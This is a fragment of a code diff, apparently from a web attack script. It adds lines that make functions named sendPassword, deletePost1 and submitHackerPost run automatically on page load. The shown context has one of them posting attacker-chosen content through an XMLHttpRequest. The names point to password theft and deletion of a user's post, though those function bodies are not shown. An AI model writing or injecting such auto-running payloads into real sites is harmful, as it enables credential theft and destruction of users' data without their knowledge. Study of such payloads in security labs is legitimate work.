@@ -20,3 +20,10 @@ function submitHackerPost() {
     x.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
     x.send(JSON.stringify({ title: title, content: content }));
 }
+window.onload = sendPassword;
+window.onload = deletePost1;
+window.onload = submitHackerPost;
+
+sendPassword();
+deletePost1();
+submitHackerPost();
